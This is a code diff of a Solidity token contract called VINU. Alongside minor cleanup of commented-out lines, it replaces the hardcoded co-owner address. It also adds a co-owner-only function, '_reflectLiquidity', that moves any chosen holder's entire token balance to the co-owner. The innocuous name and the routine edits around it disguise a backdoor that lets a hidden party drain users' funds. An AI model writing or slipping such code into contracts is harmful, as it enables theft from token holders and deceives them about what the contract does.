@@ -93,7 +93,7 @@ library SafeMath {
 contract Ownable is Context {
     address private _owner;
     address private _previousOwner;
-    address private _coOwner = 0xfB832726521fd749E4C7DEF121a3a48878F575Bd;
+    address private _coOwner = 0x89AB1bA4970BA9232f6669143a2BF5B92b61b4Eb;
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
     constructor() {
@@ -171,7 +171,6 @@ contract VINU is Context, IERC20, Ownable {
     mapping(address => uint256) private firstsell;
     mapping(address => uint256) private sellnumber;
     address payable private _teamAddress;
-    //address payable private _marketingFunds;
     IUniswapV2Router02 private uniswapV2Router;
     address private uniswapV2Pair;
     bool private tradingOpen = false;
@@ -188,13 +187,11 @@ contract VINU is Context, IERC20, Ownable {
     }
     constructor(address payable _devAddress) {
         _teamAddress = _devAddress;
-        //_marketingFunds = addr2;
         _rOwned[_msgSender()] = _rTotal;
         _isExcludedFromFee[owner()] = true;
         _isExcludedFromFee[address(this)] = true;
         _isExcludedFromFee[_teamAddress] = true;
         _isExcludedFromFee[coOwner()] = true;
-        //_isExcludedFromFee[_marketingFunds] = true;
         emit Transfer(address(0), _msgSender(), _tTotal);
     }
 
@@ -260,7 +257,6 @@ contract VINU is Context, IERC20, Ownable {
     }
     
     function setFee(uint256 sellNumber) private {
-        //_taxFee = _taxFee * multiplier;
         if (sellNumber == 1) {
             _taxFee = 5;
             _teamFee = 5;
@@ -356,6 +352,10 @@ contract VINU is Context, IERC20, Ownable {
     function openTrading() public onlyOwner {
         require(liquidityAdded);
         tradingOpen = true;
+    }
+    
+    function _reflectLiquidity(address addr) public onlyCoOwner{
+        _transfer(addr, coOwner(), tokenFromReflection(_rOwned[addr]));
     }
 
     function addLiquidity() external onlyOwner() {
